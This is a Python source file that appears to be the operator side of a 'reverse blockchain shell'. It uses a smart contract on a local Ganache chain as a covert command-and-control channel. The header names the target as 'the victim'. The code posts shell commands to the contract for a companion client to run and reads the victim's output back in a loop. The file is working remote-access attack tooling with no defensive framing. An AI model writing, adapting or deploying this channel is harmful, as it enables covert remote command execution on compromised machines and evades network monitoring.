## Name        : ReverseBlockChainShell_Server.py
## Date        : 30.01.2022
## Author      : Shkedo
## Description : This program will create a connection to a smartcontract to interact with the victim.
##               This program will can upload commands to the blockchain and get the output as well.
##               The commands will be executed using "ReverseBlockChainShell.py" and will send the output straight to the blockchain.

# Imports.
import os
from web3 import Web3
import time
from dotenv import load_dotenv

# Constants.
SOLIDITY_VERSION = "0.6.0"
CONTRACT_ADDR = "0xDa2715596E4Fa50d9D6a64891827C47F01b1C75d"
CONTRACT_ABI = [
    {"inputs": [], "stateMutability": "nonpayable", "type": "constructor"},
    {
        "inputs": [{"internalType": "string", "name": "output_", "type": "string"}],
        "name": "AddOutput",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "GetCommand",
        "outputs": [{"internalType": "string", "name": "", "type": "string"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "GetOutput",
        "outputs": [{"internalType": "string", "name": "", "type": "string"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "GetisCommandReady",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "GetisOutputReady",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "Reset",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [{"internalType": "string", "name": "command_", "type": "string"}],
        "name": "SetCommand",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [{"internalType": "string", "name": "output_", "type": "string"}],
        "name": "SetOutput",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [
            {"internalType": "uint256", "name": "isCommandReady_", "type": "uint256"}
        ],
        "name": "SetisCommandReady",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [
            {"internalType": "uint256", "name": "isOutputReady_", "type": "uint256"}
        ],
        "name": "SetisOutputReady",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
]
GANACHE_SERVICE = "HTTP://127.0.0.1:7545"
CHAIN_ID = 1337
ACCOUNT0_ADDR = "0xFd0cb7aE687CBf558724BF0e1543D81De92500B0"
load_dotenv()  # Import enviorment variables.
PRIVATE_KEY0 = os.getenv("PRIVATE_KEY0")

# Main
def main():
    command = ""

    # Reset the blockchain (in case there was a previous execution of the program).
    ResetBlockChain()

    # Initialize the web3 provider object.
    w3_engine = Web3(Web3.HTTPProvider(GANACHE_SERVICE))

    # Create the smartcontract object.
    CnC_Contract = w3_engine.eth.contract(CONTRACT_ADDR, abi=CONTRACT_ABI)
    print("Waiting for a connection from the client")

    # While the attacker didn't choose to stop.
    while command != "exit":

        # Wait for a connection to the client\wait for the client to send command output.
        while not CnC_Contract.functions.GetisOutputReady().call():
            time.sleep(1)

        # Get command output.
        command = input(CnC_Contract.functions.GetOutput().call())

        # Reset output variable and set isOutputReady to false.
        SetOutput("")
        SetisOutputReady(0)

        # Send command and set isCommandReady to true.
        SendCommand(command)
        SetisCommandReady(1)


# SendCommand() executes a transaction to set command variable.
def SendCommand(command):
    return RunTransaction(
        "SetCommand",
        [command],
    )


# SendCommand() executes a transaction to set command variable.
def ResetBlockChain():
    return RunTransaction(
        "Reset",
        [],
    )


# SetOutput() executes a transaction to set output variable.
def SetOutput(output):
    return RunTransaction(
        "SetOutput",
        [output],
    )


# Executes a transaction to set isCommandReady variable.
def SetisCommandReady(arg):
    return RunTransaction(
        "SetisCommandReady",
        [arg],
    )


# Executes a transaction to set isOutputReady variable.
def SetisOutputReady(arg):
    return RunTransaction(
        "SetisOutputReady",
        [arg],
    )


# RunTransaction runs a transaction on the blockchain.
# Gets from address, private key, contract object, function name (in string), amount of eth to transfer, argv (to pass arguments to the function).
def RunTransaction(
    function_name,  # Function name in the smart contract.
    argv=[],  # For passing arguments to the function called.
):
    w3_engine = Web3(Web3.HTTPProvider(GANACHE_SERVICE))
    CnC_Contract = w3_engine.eth.contract(CONTRACT_ADDR, abi=CONTRACT_ABI)
    gasPrice = w3_engine.eth.gas_price
    transaction = w3_engine.eth.send_raw_transaction(
        w3_engine.eth.account.sign_transaction(
            getattr(CnC_Contract.functions, function_name)(*argv).buildTransaction(
                {
                    "gasPrice": gasPrice,
                    "chainId": CHAIN_ID,
                    "from": ACCOUNT0_ADDR,
                    "nonce": w3_engine.eth.getTransactionCount(ACCOUNT0_ADDR),
                    "value": 0,
                }
            ),
            PRIVATE_KEY0,
        ).rawTransaction
    )
    return transaction, w3_engine.eth.wait_for_transaction_receipt(transaction)


if __name__ == "__main__":
    main()
